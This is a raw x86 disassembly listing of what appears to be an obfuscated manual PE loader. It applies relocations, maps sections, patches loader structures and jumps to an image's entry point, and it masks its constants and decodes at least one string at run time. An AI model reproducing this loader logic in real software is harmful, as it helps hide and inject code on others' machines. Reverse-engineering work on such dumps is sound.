  42192f:	add    eax,edx
  421931:	cmp    esi,eax
  421933:	je     0x421a5a
  421939:	mov    eax,DWORD PTR [ebp+0x8]
  42193c:	mov    esi,DWORD PTR [ebp+0x8]
  42193f:	add    esi,DWORD PTR [eax+0x3c]
  421942:	push   edi
  421943:	mov    DWORD PTR [ebp+0xc],esi
  421946:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  42194d:	mov    eax,DWORD PTR [ebp-0x1c]
  421950:	mov    esi,DWORD PTR [ebp-0x4]
  421953:	mov    edi,DWORD PTR [ebp+0xc]
  421956:	xor    esi,ecx
  421958:	xor    eax,ecx
  42195a:	add    esi,edx
  42195c:	cmp    DWORD PTR [edi+eax*8+0x1939848],esi
  421963:	je     0x421a54
  421969:	mov    esi,DWORD PTR [ebp+0xc]
  42196c:	mov    eax,DWORD PTR [ebp+0x8]
  42196f:	add    eax,DWORD PTR [esi+0xa0]
  421975:	mov    esi,DWORD PTR [ebp+0x8]
  421978:	mov    edi,DWORD PTR [ebp+0xc]
  42197b:	sub    esi,DWORD PTR [edi+0x34]
  42197e:	mov    edi,DWORD PTR [ebp-0x4]
  421981:	xor    edi,ecx
  421983:	add    edi,edx
  421985:	mov    DWORD PTR [ebp-0x24],esi
  421988:	cmp    esi,edi
  42198a:	je     0x421a54
  421990:	mov    esi,DWORD PTR [ebp-0x4]
  421993:	xor    esi,ecx
  421995:	add    esi,edx
  421997:	mov    DWORD PTR [ebp-0x8],esi
  42199a:	push   ebx
  42199b:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4219a2:	jmp    0x421a3e
  4219a7:	mov    esi,DWORD PTR [ebp-0x4]
  4219aa:	xor    esi,ecx
  4219ac:	lea    edi,[ebx-0x8]
  4219af:	add    esi,edx
  4219b1:	shr    edi,1
  4219b3:	cmp    esi,edi
  4219b5:	jae    0x421a24
  4219b7:	sub    edi,esi
  4219b9:	lea    ebx,[eax+esi*2+0x8]
  4219bd:	mov    DWORD PTR [ebp-0x18],edi
  4219c0:	movzx  esi,WORD PTR [ebx]
  4219c3:	and    esi,0xfff
  4219c9:	mov    DWORD PTR [ebp-0x14],esi
  4219cc:	mov    edi,DWORD PTR [ebp-0x14]
  4219cf:	mov    esi,DWORD PTR [eax]
  4219d1:	sub    esi,edx
  4219d3:	add    edi,esi
  4219d5:	movzx  esi,WORD PTR [ebx]
  4219d8:	shr    esi,0xc
  4219db:	xor    edi,ecx
  4219dd:	mov    DWORD PTR [ebp-0x20],edi
  4219e0:	mov    DWORD PTR [ebp-0x14],esi
  4219e3:	mov    esi,DWORD PTR [ebp-0x20]
  4219e6:	mov    edi,DWORD PTR [ebp+0x8]
  4219e9:	xor    esi,ecx
  4219eb:	lea    esi,[esi+edi*1+0x3272fa]
  4219f2:	mov    DWORD PTR [ebp-0x20],esi
  4219f5:	mov    esi,DWORD PTR [ebp-0x10]
  4219f8:	mov    edi,DWORD PTR [ebp-0x14]
  4219fb:	xor    esi,ecx
  4219fd:	add    esi,edx
  4219ff:	cmp    edi,esi
  421a01:	jne    0x421a19
  421a03:	mov    esi,DWORD PTR [ebp-0x10]
  421a06:	mov    edi,DWORD PTR [ebp-0x14]
  421a09:	xor    esi,ecx
  421a0b:	add    esi,edx
  421a0d:	cmp    edi,esi
  421a0f:	jne    0x421a19
  421a11:	mov    esi,DWORD PTR [ebp-0x20]
  421a14:	mov    edi,DWORD PTR [ebp-0x24]
  421a17:	add    DWORD PTR [esi],edi
  421a19:	add    ebx,0x2
  421a1c:	dec    DWORD PTR [ebp-0x18]
  421a1f:	jne    0x4219c0
  421a21:	mov    ebx,DWORD PTR [ebp-0xc]
  421a24:	add    DWORD PTR [ebp-0x8],ebx
  421a27:	mov    esi,DWORD PTR [ebp-0x1c]
  421a2a:	mov    edi,DWORD PTR [ebp-0x8]
  421a2d:	mov    ebx,DWORD PTR [ebp+0xc]
  421a30:	xor    esi,ecx
  421a32:	cmp    edi,DWORD PTR [ebx+esi*8+0x193984c]
  421a39:	jae    0x421a53
  421a3b:	add    eax,DWORD PTR [ebp-0xc]
  421a3e:	mov    esi,DWORD PTR [ebp-0x4]
  421a41:	mov    ebx,DWORD PTR [eax+0x4]
  421a44:	xor    esi,ecx
  421a46:	add    esi,edx
  421a48:	mov    DWORD PTR [ebp-0xc],ebx
  421a4b:	cmp    ebx,esi
  421a4d:	jne    0x4219a7
  421a53:	pop    ebx
  421a54:	mov    eax,DWORD PTR [ebp-0x28]
  421a57:	pop    edi
  421a58:	jmp    0x421a5d
  421a5a:	mov    eax,DWORD PTR [ebp-0x4]
  421a5d:	xor    eax,ecx
  421a5f:	add    eax,edx
  421a61:	pop    esi
  421a62:	leave  
  421a63:	ret    0x8
  421a66:	push   ebp
  421a67:	mov    ebp,esp
  421a69:	sub    esp,0xd8
  421a6f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  421a76:	mov    DWORD PTR [ebp-0x24],0xf89c85b4
  421a7d:	mov    eax,DWORD PTR [ebp-0x4]
  421a80:	push   ebx
  421a81:	push   esi
  421a82:	mov    esi,0x75108b3
  421a87:	xor    eax,esi
  421a89:	push   edi
  421a8a:	mov    edi,0x3272fa
  421a8f:	add    eax,edi
  421a91:	mov    DWORD PTR [ebp-0x18],eax
  421a94:	mov    eax,DWORD PTR [ebp-0x4]
  421a97:	xor    eax,esi
  421a99:	add    eax,edi
  421a9b:	mov    DWORD PTR [ebp-0x8],eax
  421a9e:	mov    ebx,DWORD PTR [ebp+0x20]
  421aa1:	mov    eax,DWORD PTR [ebp-0x1c]
  421aa4:	mov    ecx,DWORD PTR [ebp-0x1c]
  421aa7:	xor    eax,ecx
  421aa9:	mov    DWORD PTR [ebp-0x1c],eax
  421aac:	add    DWORD PTR [ebp-0x1c],0xf89cb5b5
  421ab3:	mov    eax,DWORD PTR [ebp-0xc]
  421ab6:	mov    ecx,DWORD PTR [ebp-0xc]
  421ab9:	xor    eax,ecx
  421abb:	mov    DWORD PTR [ebp-0xc],eax
  421abe:	add    DWORD PTR [ebp-0xc],0xf89c85f5
  421ac5:	mov    eax,DWORD PTR [ebp-0x10]
  421ac8:	mov    ecx,DWORD PTR [ebp-0x10]
  421acb:	xor    eax,ecx
  421acd:	mov    DWORD PTR [ebp-0x10],eax
  421ad0:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  421ad7:	mov    eax,DWORD PTR [ebp-0x28]
  421ada:	mov    ecx,DWORD PTR [ebp-0x28]
  421add:	xor    eax,ecx
  421adf:	mov    DWORD PTR [ebp-0x28],eax
  421ae2:	add    DWORD PTR [ebp-0x28],0xf89f05b5
  421ae9:	mov    DWORD PTR [ebp+0x20],0xf89cefe0
  421af0:	mov    eax,DWORD PTR [ebp+0x8]
  421af3:	test   eax,eax
  421af5:	je     0x421f7c
  421afb:	mov    eax,DWORD PTR [ebp+0xc]
  421afe:	test   eax,eax
  421b00:	je     0x421f7c
  421b06:	mov    eax,DWORD PTR [ebp+0x18]
  421b09:	test   eax,eax
  421b0b:	je     0x421f7c
  421b11:	mov    eax,DWORD PTR [ebp+0x20]
  421b14:	mov    ecx,DWORD PTR [ebp+0x8]
  421b17:	xor    eax,0x8b3
  421b1c:	add    eax,0x72fa
  421b21:	cmp    WORD PTR [ecx],ax
  421b24:	jne    0x421f7c
  421b2a:	mov    eax,DWORD PTR [ebp-0x4]
  421b2d:	xor    eax,esi
  421b2f:	add    eax,edi
  421b31:	mov    DWORD PTR [ebp-0x30],eax
  421b34:	mov    eax,DWORD PTR [ebp-0x4]
  421b37:	mov    ecx,DWORD PTR [ebp+0x8]
  421b3a:	mov    eax,DWORD PTR [ebp+0x8]
  421b3d:	add    eax,DWORD PTR [ecx+0x3c]
  421b40:	mov    DWORD PTR [ebp+0xc],eax
  421b43:	mov    eax,DWORD PTR [eax+0x50]
  421b46:	test   eax,eax
  421b48:	je     0x421f7c
  421b4e:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  421b55:	mov    eax,DWORD PTR [ebp-0x2c]
  421b58:	xor    eax,esi
  421b5a:	add    eax,edi
  421b5c:	mov    DWORD PTR [ebp-0x2c],eax
  421b5f:	mov    eax,DWORD PTR [ebp-0x4]
  421b62:	mov    eax,DWORD PTR [ebx+0x190]
  421b68:	mov    ecx,DWORD PTR [eax]
  421b6a:	mov    ecx,DWORD PTR [ecx+0x3c]
  421b6d:	add    ecx,DWORD PTR [eax]
  421b6f:	mov    eax,DWORD PTR [ebp-0x4]
  421b72:	mov    eax,DWORD PTR [ebx+0x18c]
  421b78:	mov    edx,DWORD PTR [eax]
  421b7a:	mov    DWORD PTR [ebp-0x20],ecx
  421b7d:	mov    DWORD PTR [ebp+0x20],edx
  421b80:	cmp    edx,edx
  421b82:	jne    0x421bb6
  421b84:	mov    eax,DWORD PTR [ebx+0x1e0]
  421b8a:	lea    edx,[ebp-0x18]
  421b8d:	push   edx
  421b8e:	mov    edx,DWORD PTR [ebp-0xc]
  421b91:	xor    edx,esi
  421b93:	add    edx,edi
  421b95:	push   edx
  421b96:	push   DWORD PTR [ecx+0x50]
  421b99:	push   DWORD PTR [ebp+0x20]
  421b9c:	call   DWORD PTR [eax+0x1c]
  421b9f:	mov    eax,DWORD PTR [ebp-0x20]
  421ba2:	mov    ecx,DWORD PTR [eax+0x54]
  421ba5:	mov    eax,DWORD PTR [eax+0x50]
  421ba8:	sub    eax,ecx
  421baa:	add    ecx,DWORD PTR [ebp+0x20]
  421bad:	push   ecx
  421bae:	call   0x422519
  421bb3:	mov    edx,DWORD PTR [ebp+0x20]
  421bb6:	mov    eax,DWORD PTR [ebx+0x194]
  421bbc:	mov    DWORD PTR [eax],edx
  421bbe:	mov    eax,DWORD PTR [ebp+0xc]
  421bc1:	push   DWORD PTR [eax+0x54]
  421bc4:	push   DWORD PTR [ebp+0x8]
  421bc7:	push   edx
  421bc8:	call   0x42240f
  421bcd:	mov    ecx,DWORD PTR [ebp+0x20]
  421bd0:	mov    eax,DWORD PTR [ecx+0x3c]
  421bd3:	add    eax,ecx
  421bd5:	movzx  ecx,WORD PTR [eax+0x14]
  421bd9:	lea    ecx,[ecx+eax*1+0x18]
  421bdd:	mov    DWORD PTR [ebp+0x18],ecx
  421be0:	mov    ecx,DWORD PTR [ebp-0x4]
  421be3:	movzx  edx,WORD PTR [eax+0x6]
  421be7:	xor    ecx,esi
  421be9:	add    ecx,edi
  421beb:	mov    DWORD PTR [ebp+0xc],eax
  421bee:	cmp    edx,ecx
  421bf0:	je     0x421c9d
  421bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  421bf9:	xor    ecx,esi
  421bfb:	add    ecx,edi
  421bfd:	mov    DWORD PTR [ebp-0x8],ecx
  421c00:	mov    ecx,DWORD PTR [ebp-0x24]
  421c03:	movzx  edx,WORD PTR [eax+0x6]
  421c07:	xor    ecx,esi
  421c09:	sub    edx,ecx
  421c0b:	sub    edx,edi
  421c0d:	cmp    DWORD PTR [ebp-0x8],edx
  421c10:	ja     0x421c9d
  421c16:	mov    edx,DWORD PTR [ebp+0x18]
  421c19:	add    edx,0x8
  421c1c:	mov    DWORD PTR [ebp+0x18],edx
  421c1f:	jmp    0x421c24
  421c21:	mov    edx,DWORD PTR [ebp+0x18]
  421c24:	mov    eax,DWORD PTR [eax+0x38]
  421c27:	lea    ecx,[eax-0x1]
  421c2a:	mov    DWORD PTR [ebp-0x38],eax
  421c2d:	mov    eax,DWORD PTR [edx]
  421c2f:	test   eax,ecx
  421c31:	je     0x421c3a
  421c33:	not    ecx
  421c35:	and    eax,ecx
  421c37:	add    eax,DWORD PTR [ebp-0x38]
  421c3a:	mov    ecx,DWORD PTR [edx+0x4]
  421c3d:	add    ecx,DWORD PTR [ebp+0x20]
  421c40:	push   ecx
  421c41:	call   0x422519
  421c46:	mov    edx,DWORD PTR [ebp-0x4]
  421c49:	mov    eax,DWORD PTR [ebp+0x18]
  421c4c:	mov    ecx,DWORD PTR [eax+0x8]
  421c4f:	xor    edx,esi
  421c51:	add    edx,edi
  421c53:	cmp    ecx,edx
  421c55:	je     0x421c6e
  421c57:	push   ecx
  421c58:	mov    ecx,DWORD PTR [ebp+0x8]
  421c5b:	add    ecx,DWORD PTR [eax+0xc]
  421c5e:	mov    eax,DWORD PTR [eax+0x4]
  421c61:	add    eax,DWORD PTR [ebp+0x20]
  421c64:	push   ecx
  421c65:	push   eax
  421c66:	call   0x42240f
  421c6b:	mov    eax,DWORD PTR [ebp+0x18]
  421c6e:	mov    ecx,DWORD PTR [ebp-0x24]
  421c71:	mov    edx,DWORD PTR [ebp-0x8]
  421c74:	add    eax,0x28
  421c77:	xor    ecx,esi
  421c79:	lea    ecx,[edx+ecx*1+0x3272fa]
  421c80:	mov    edx,DWORD PTR [ebp+0xc]
  421c83:	mov    DWORD PTR [ebp+0x18],eax
  421c86:	mov    eax,DWORD PTR [ebp-0x24]
  421c89:	movzx  edx,WORD PTR [edx+0x6]
  421c8d:	xor    eax,esi
  421c8f:	sub    edx,eax
  421c91:	mov    eax,DWORD PTR [ebp+0xc]
  421c94:	sub    edx,edi
  421c96:	mov    DWORD PTR [ebp-0x8],ecx
  421c99:	cmp    ecx,edx
  421c9b:	jbe    0x421c21
  421c9d:	mov    edx,DWORD PTR [ebx+0x18c]
  421ca3:	mov    ecx,DWORD PTR [ebp+0x20]
  421ca6:	cmp    ecx,DWORD PTR [edx]
  421ca8:	jne    0x421cd1
  421caa:	mov    eax,DWORD PTR [ebx+0x1e0]
  421cb0:	lea    edx,[ebp-0x18]
  421cb3:	push   edx
  421cb4:	mov    edx,DWORD PTR [ebp-0x10]
  421cb7:	xor    edx,esi
  421cb9:	add    edx,edi
  421cbb:	push   edx
  421cbc:	mov    edx,DWORD PTR [ebp-0x20]
  421cbf:	push   DWORD PTR [edx+0x54]
  421cc2:	push   ecx
  421cc3:	call   DWORD PTR [eax+0x1c]
  421cc6:	test   eax,eax
  421cc8:	je     0x421f6d
  421cce:	mov    eax,DWORD PTR [ebp+0xc]
  421cd1:	mov    ecx,DWORD PTR [ebx+0x1c8]
  421cd7:	mov    ecx,DWORD PTR [ecx]
  421cd9:	xor    ecx,esi
  421cdb:	add    ecx,edi
  421cdd:	je     0x421e98
  421ce3:	mov    eax,DWORD PTR [ebp-0x4]
  421ce6:	xor    eax,esi
  421ce8:	add    eax,edi
  421cea:	and    DWORD PTR [ebp+0x8],0x0
  421cee:	mov    DWORD PTR [ebp-0x14],eax
  421cf1:	mov    eax,0xf89c85d9
  421cf6:	lea    ecx,[eax-0x18]
  421cf9:	mov    DWORD PTR [ebp-0x58],0xf89c85c7
  421d00:	mov    DWORD PTR [ebp-0x54],0xf89c85c9
  421d07:	mov    DWORD PTR [ebp-0x50],eax
  421d0a:	mov    DWORD PTR [ebp-0x4c],ecx
  421d0d:	mov    DWORD PTR [ebp-0x48],ecx
  421d10:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  421d17:	mov    edx,DWORD PTR [ebp+0x8]
  421d1a:	mov    ecx,0x8b3
  421d1f:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  421d24:	mov    edx,0x72fa
  421d29:	add    cx,dx
  421d2c:	mov    edx,DWORD PTR [ebp+0x8]
  421d2f:	inc    DWORD PTR [ebp+0x8]
  421d32:	cmp    DWORD PTR [ebp+0x8],0x6
  421d36:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  421d3e:	jb     0x421d17
  421d40:	mov    ecx,0xf89c85cb
  421d45:	mov    DWORD PTR [ebp-0xb0],eax
  421d4b:	mov    DWORD PTR [ebp-0x9c],eax
  421d51:	mov    DWORD PTR [ebp-0x74],eax
  421d54:	mov    DWORD PTR [ebp-0x70],eax
  421d57:	lea    eax,[ecx-0x1]
  421d5a:	lea    edx,[ecx+0x34]
  421d5d:	mov    DWORD PTR [ebp-0x64],eax
  421d60:	mov    DWORD PTR [ebp-0x60],eax
  421d63:	mov    DWORD PTR [ebp-0xb4],0xf89c85e1
  421d6d:	mov    DWORD PTR [ebp-0xac],ecx
  421d73:	mov    DWORD PTR [ebp-0xa8],edx
  421d79:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  421d83:	mov    DWORD PTR [ebp-0xa0],0xf89c85c7
  421d8d:	mov    DWORD PTR [ebp-0x98],0xf89c85f8
  421d97:	mov    DWORD PTR [ebp-0x94],0xf89c85c7
  421da1:	mov    DWORD PTR [ebp-0x90],0xf89c85c9
  421dab:	mov    DWORD PTR [ebp-0x8c],ecx
  421db1:	mov    DWORD PTR [ebp-0x88],0xf89c85cc
  421dbb:	mov    DWORD PTR [ebp-0x84],edx
  421dc1:	mov    DWORD PTR [ebp-0x80],0xf89c85c6
  421dc8:	mov    DWORD PTR [ebp-0x7c],ecx
  421dcb:	mov    DWORD PTR [ebp-0x78],0xf89c85f4
  421dd2:	mov    DWORD PTR [ebp-0x6c],ecx
  421dd5:	mov    DWORD PTR [ebp-0x68],0xf89c85d8
  421ddc:	mov    DWORD PTR [ebp-0x5c],0xf89c85b5
  421de3:	xor    eax,eax
  421de5:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  421dec:	xor    cl,0xb3
  421def:	sub    cl,0x6
  421df2:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  421df9:	inc    eax
  421dfa:	cmp    eax,0x17
  421dfd:	jb     0x421de5
  421dff:	mov    eax,DWORD PTR [ebx+0x1e0]
  421e05:	lea    ecx,[ebp-0xc0]
  421e0b:	push   ecx
  421e0c:	call   DWORD PTR [eax+0x4]
  421e0f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  421e15:	lea    edx,[ebp-0xd8]
  421e1b:	push   edx
  421e1c:	push   eax
  421e1d:	call   DWORD PTR [ecx+0x8]
  421e20:	mov    DWORD PTR [ebp-0x40],eax
  421e23:	lea    eax,[ebp-0x14]
  421e26:	push   eax
  421e27:	mov    eax,DWORD PTR [ebx+0x18c]
  421e2d:	push   DWORD PTR [eax]
  421e2f:	mov    eax,DWORD PTR [ebp-0x40]
  421e32:	call   eax
  421e34:	mov    eax,DWORD PTR [ebp-0x4]
  421e37:	xor    eax,esi
  421e39:	add    eax,edi
  421e3b:	mov    DWORD PTR [ebp-0x34],eax
  421e3e:	mov    ecx,DWORD PTR [ebp-0x4]
  421e41:	mov    eax,DWORD PTR [ebp-0x14]
  421e44:	xor    ecx,esi
  421e46:	add    ecx,edi
  421e48:	cmp    eax,ecx
  421e4a:	je     0x421e95
  421e4c:	mov    DWORD PTR [ebp-0x3c],eax
  421e4f:	jmp    0x421e60
  421e51:	mov    eax,DWORD PTR [eax]
  421e53:	mov    ecx,DWORD PTR [ebp-0x3c]
  421e56:	mov    DWORD PTR [ebp-0x14],eax
  421e59:	mov    eax,DWORD PTR [ebp-0x14]
  421e5c:	cmp    eax,ecx
  421e5e:	je     0x421e6d
  421e60:	mov    edx,DWORD PTR [eax+0x18]
  421e63:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e69:	cmp    edx,DWORD PTR [ecx]
  421e6b:	jne    0x421e51
  421e6d:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e73:	mov    edx,DWORD PTR [eax+0x18]
  421e76:	cmp    edx,DWORD PTR [ecx]
  421e78:	jne    0x421e95
  421e7a:	mov    ecx,DWORD PTR [ebx+0x190]
  421e80:	mov    edx,DWORD PTR [ebp-0x20]
  421e83:	mov    edx,DWORD PTR [edx+0x28]
  421e86:	add    edx,DWORD PTR [ecx]
  421e88:	mov    DWORD PTR [eax+0x1c],edx
  421e8b:	mov    eax,DWORD PTR [ebp-0x24]
  421e8e:	xor    eax,esi
  421e90:	add    eax,edi
  421e92:	mov    DWORD PTR [ebp-0x34],eax
  421e95:	mov    eax,DWORD PTR [ebp+0xc]
  421e98:	push   ebx
  421e99:	push   eax
  421e9a:	push   DWORD PTR [ebp+0x20]
  421e9d:	call   0x42161d
  421ea2:	test   eax,eax
  421ea4:	je     0x421f6d
  421eaa:	push   DWORD PTR [ebp+0xc]
  421ead:	mov    ecx,ebx
  421eaf:	push   DWORD PTR [ebp+0x20]
  421eb2:	call   0x421576
  421eb7:	test   eax,eax
  421eb9:	je     0x421f6d
  421ebf:	mov    eax,DWORD PTR [ebp+0xc]
  421ec2:	mov    edx,DWORD PTR [ebp+0x20]
  421ec5:	mov    ecx,ebx
  421ec7:	call   0x42144f
  421ecc:	test   eax,eax
  421ece:	je     0x421f6d
  421ed4:	push   ebx
  421ed5:	push   DWORD PTR [ebp+0x20]
  421ed8:	call   0x421900
  421edd:	test   eax,eax
  421edf:	je     0x421f6d
  421ee5:	mov    eax,DWORD PTR [ebx+0x18c]
  421eeb:	mov    edx,DWORD PTR [ebp+0x20]
  421eee:	cmp    edx,DWORD PTR [eax]
  421ef0:	jne    0x421f0c
  421ef2:	mov    eax,DWORD PTR [ebx+0x1e0]
  421ef8:	lea    ecx,[ebp-0x18]
  421efb:	push   ecx
  421efc:	push   DWORD PTR [ebp-0x18]
  421eff:	mov    ecx,DWORD PTR [ebp-0x20]
  421f02:	push   DWORD PTR [ecx+0x54]
  421f05:	push   edx
  421f06:	call   DWORD PTR [eax+0x1c]
  421f09:	mov    edx,DWORD PTR [ebp+0x20]
  421f0c:	mov    eax,DWORD PTR [ebx+0x1c8]
  421f12:	mov    eax,DWORD PTR [eax]
  421f14:	xor    eax,esi
  421f16:	add    eax,edi
  421f18:	je     0x421f51
  421f1a:	mov    ecx,DWORD PTR [ebp+0xc]
  421f1d:	mov    eax,DWORD PTR [ecx+0x28]
  421f20:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  421f27:	mov    esi,DWORD PTR [ebp+0x8]
  421f2a:	push   DWORD PTR [ebp+0x14]
  421f2d:	xor    esi,0x8b3
  421f33:	push   DWORD PTR [ebp+0x10]
  421f36:	add    esi,0x72fa
  421f3c:	or     WORD PTR [ecx+0x16],si
  421f40:	add    eax,edx
  421f42:	push   edx
  421f43:	call   eax
  421f45:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b4
  421f4f:	jmp    0x421f5b
  421f51:	mov    eax,DWORD PTR [ebp+0xc]
  421f54:	mov    eax,DWORD PTR [eax+0x28]
  421f57:	add    eax,edx
  421f59:	call   eax
  421f5b:	mov    DWORD PTR [ebp-0x8],eax
  421f5e:	mov    eax,DWORD PTR [ebp-0x8]
  421f61:	mov    ecx,DWORD PTR [ebp+0x1c]
  421f64:	mov    DWORD PTR [ecx],eax
  421f66:	mov    DWORD PTR [ebp-0x30],0x1
  421f6d:	cmp    DWORD PTR [ebp-0x30],0x0
  421f71:	jne    0x421f77
  421f73:	and    DWORD PTR [ebp+0x20],0x0
  421f77:	mov    eax,DWORD PTR [ebp+0x20]
  421f7a:	jmp    0x421f7e
  421f7c:	xor    eax,eax
  421f7e:	pop    edi
  421f7f:	pop    esi
  421f80:	pop    ebx
  421f81:	leave  
  421f82:	ret    0x1c
  421f85:	push   ebp
  421f86:	mov    ebp,esp
  421f88:	movzx  edx,WORD PTR [ecx+0x6]
  421f8c:	movzx  eax,WORD PTR [ecx+0x14]
  421f90:	push   ebx
  421f91:	push   edi
  421f92:	xor    edi,edi
  421f94:	lea    eax,[eax+ecx*1+0x18]
  421f98:	test   edx,edx
  421f9a:	je     0x421fbb
  421f9c:	mov    ecx,DWORD PTR [eax+0xc]
  421f9f:	lea    ebx,[ecx+esi*1]
  421fa2:	cmp    DWORD PTR [ebp+0x8],ebx
  421fa5:	jb     0x421fb3
  421fa7:	mov    ebx,DWORD PTR [eax+0x8]
  421faa:	add    ebx,ecx
  421fac:	add    ebx,esi
  421fae:	cmp    DWORD PTR [ebp+0x8],ebx
  421fb1:	jb     0x421fbd
  421fb3:	add    eax,0x28
  421fb6:	inc    edi
  421fb7:	cmp    edi,edx
  421fb9:	jb     0x421f9c
  421fbb:	xor    eax,eax
  421fbd:	pop    edi
  421fbe:	pop    ebx
  421fbf:	pop    ebp
  421fc0:	ret    0x4
  421fc3:	push   ebp
  421fc4:	mov    ebp,esp
  421fc6:	sub    esp,0x34
  421fc9:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  421fd0:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  421fd7:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  421fde:	mov    DWORD PTR [ebp-0x8],0xf89c85d4
  421fe5:	mov    DWORD PTR [ebp-0x20],0xf89c85f4
  421fec:	mov    DWORD PTR [ebp-0x2c],0xf89c8533
  421ff3:	mov    DWORD PTR [ebp-0x2c],0xf89c85d3
  421ffa:	mov    DWORD PTR [ebp-0x10],eax
  421ffd:	mov    eax,DWORD PTR [ebp+0x8]
  422000:	mov    DWORD PTR [ebp-0x14],eax
  422003:	mov    eax,DWORD PTR [ebp-0xc]
  422006:	push   ebx
  422007:	mov    ecx,0x75108b3
  42200c:	xor    eax,ecx
  42200e:	push   esi
  42200f:	mov    esi,DWORD PTR [ebp-0x10]
  422012:	mov    edx,0x3272fa
  422017:	add    eax,edx
  422019:	push   edi
  42201a:	cmp    esi,eax
  42201c:	je     0x4221fb
  422022:	mov    eax,DWORD PTR [ebp-0xc]
  422025:	mov    esi,DWORD PTR [ebp-0x14]
  422028:	xor    eax,ecx
  42202a:	add    eax,edx
  42202c:	cmp    esi,eax
  42202e:	je     0x4221fb
  422034:	mov    eax,DWORD PTR [ebp-0xc]
  422037:	xor    eax,ecx
  422039:	add    eax,edx
  42203b:	mov    DWORD PTR [ebp-0x24],eax
  42203e:	mov    eax,DWORD PTR [ebp-0xc]
  422041:	xor    eax,ecx
  422043:	add    eax,edx
  422045:	mov    DWORD PTR [ebp-0x28],eax
  422048:	mov    edi,DWORD PTR [ebp-0x20]
  42204b:	mov    ebx,DWORD PTR [ebp-0x8]
  42204e:	mov    esi,0x8b3
  422053:	xor    edi,esi
  422055:	mov    eax,0x72fa
  42205a:	xor    ebx,esi
  42205c:	add    edi,eax
  42205e:	add    ebx,eax
  422060:	sub    ebx,edi
  422062:	mov    WORD PTR [ebp-0x8],bx
  422066:	jmp    0x42212b
  42206b:	mov    edi,DWORD PTR [ebp-0xc]
  42206e:	mov    bx,WORD PTR [ebp-0x4]
  422072:	xor    edi,esi
  422074:	add    edi,eax
  422076:	cmp    bx,di
  422079:	je     0x42216d
  42207f:	mov    edi,DWORD PTR [ebp-0xc]
  422082:	mov    ebx,DWORD PTR [ebp+0xc]
  422085:	xor    edi,ecx
  422087:	add    edi,edx
  422089:	cmp    ebx,edi
  42208b:	mov    di,WORD PTR [ebp-0x4]
  42208f:	mov    bx,WORD PTR [ebp+0x8]
  422093:	je     0x4220fe
  422095:	cmp    bx,di
  422098:	je     0x422107
  42209a:	mov    edi,DWORD PTR [ebp-0x20]
  42209d:	mov    bx,WORD PTR [ebp+0x8]
  4220a1:	xor    edi,esi
  4220a3:	add    edi,eax
  4220a5:	cmp    bx,di
  4220a8:	jb     0x4220c8
  4220aa:	mov    edi,DWORD PTR [ebp-0x2c]
  4220ad:	mov    bx,WORD PTR [ebp+0x8]
  4220b1:	xor    edi,esi
  4220b3:	add    edi,eax
  4220b5:	cmp    bx,di
  4220b8:	ja     0x4220c8
  4220ba:	movzx  edi,WORD PTR [ebp+0x8]
  4220be:	movzx  ebx,WORD PTR [ebp-0x8]
  4220c2:	add    edi,ebx
  4220c4:	mov    WORD PTR [ebp+0x8],di
  4220c8:	mov    edi,DWORD PTR [ebp-0x20]
  4220cb:	mov    bx,WORD PTR [ebp-0x4]
  4220cf:	xor    edi,esi
  4220d1:	add    edi,eax
  4220d3:	cmp    bx,di
  4220d6:	jb     0x4220f6
  4220d8:	mov    edi,DWORD PTR [ebp-0x2c]
  4220db:	mov    bx,WORD PTR [ebp-0x4]
  4220df:	xor    edi,esi
  4220e1:	add    edi,eax
  4220e3:	cmp    bx,di
  4220e6:	ja     0x4220f6
  4220e8:	movzx  edi,WORD PTR [ebp-0x4]
  4220ec:	movzx  ebx,WORD PTR [ebp-0x8]
  4220f0:	add    edi,ebx
  4220f2:	mov    WORD PTR [ebp-0x4],di
  4220f6:	mov    di,WORD PTR [ebp-0x4]
  4220fa:	mov    bx,WORD PTR [ebp+0x8]
  4220fe:	cmp    bx,di
  422101:	jne    0x4221fb
  422107:	mov    edi,DWORD PTR [ebp-0x1c]
  42210a:	mov    ebx,DWORD PTR [ebp-0x10]
  42210d:	xor    edi,ecx
  42210f:	lea    edi,[edi+ebx*1+0x3272fa]
  422116:	mov    DWORD PTR [ebp-0x10],edi
  422119:	mov    edi,DWORD PTR [ebp-0x1c]
  42211c:	mov    ebx,DWORD PTR [ebp-0x14]
  42211f:	xor    edi,ecx
  422121:	lea    edi,[edi+ebx*1+0x3272fa]
  422128:	mov    DWORD PTR [ebp-0x14],edi
  42212b:	mov    edi,DWORD PTR [ebp-0x24]
  42212e:	mov    ebx,DWORD PTR [ebp-0x10]
  422131:	mov    di,WORD PTR [ebx+edi*2]
  422135:	mov    WORD PTR [ebp+0x8],di
  422139:	mov    edi,DWORD PTR [ebp-0x28]
  42213c:	mov    ebx,DWORD PTR [ebp-0x14]
  42213f:	mov    di,WORD PTR [ebx+edi*2]
  422143:	mov    WORD PTR [ebp-0x4],di
  422147:	mov    edi,DWORD PTR [ebp-0xc]
  42214a:	mov    bx,WORD PTR [ebp+0x8]
  42214e:	xor    edi,esi
  422150:	add    edi,eax
  422152:	cmp    bx,di
  422155:	jne    0x42206b
  42215b:	mov    eax,DWORD PTR [ebp-0x18]
  42215e:	mov    esi,DWORD PTR [ebp-0xc]
  422161:	xor    eax,ecx
  422163:	add    eax,edx
  422165:	imul   eax,esi
  422168:	mov    DWORD PTR [ebp-0xc],eax
  42216b:	jmp    0x42217f
  42216d:	mov    eax,DWORD PTR [ebp-0xc]
  422170:	mov    esi,DWORD PTR [ebp-0x18]
